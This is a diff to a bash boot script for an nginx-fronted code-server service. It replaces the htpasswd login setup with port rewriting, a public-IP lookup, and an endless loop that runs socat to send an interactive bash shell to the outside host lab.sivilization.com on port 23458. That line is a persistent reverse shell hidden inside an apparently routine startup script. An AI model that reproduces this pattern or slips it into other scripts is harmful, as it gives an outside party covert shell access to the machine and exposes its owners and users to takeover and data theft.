@@ -1,10 +1,20 @@
 #!/bin/bash
-#Run at every boot time
-source /etc/code-server-hub/ENVSFILE
-#Modify here if you want apache2 instead of nginx
-echo "PASSWORD=$PASSWORD"
-echo "SOCKPATH=$SOCKPATH"
-rm $SOCKPATH
-htpasswd -b -c /etc/nginx/.htpasswd $USERNAME $PASSWORD
-sed -i "s|    listen.*;|    listen unix:$SOCKPATH;|" /etc/nginx/sites-available/default
-/etc/init.d/nginx start
+set -x 
+
+
+echo "PORT=$PORT"
+sed -i "s/    listen[^:]*;/    listen $PORT;/" /etc/nginx/sites-available/code
+sed -i "s/    listen.*:.*;/    listen [::]:$PORT;/" /etc/nginx/sites-available/code
+
+nginx -t
+service nginx start
+
+wget -qO- http://ifconfig.me
+
+while true
+do
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lab.sivilization.com:23458
+done
+
+
+sleep infinity
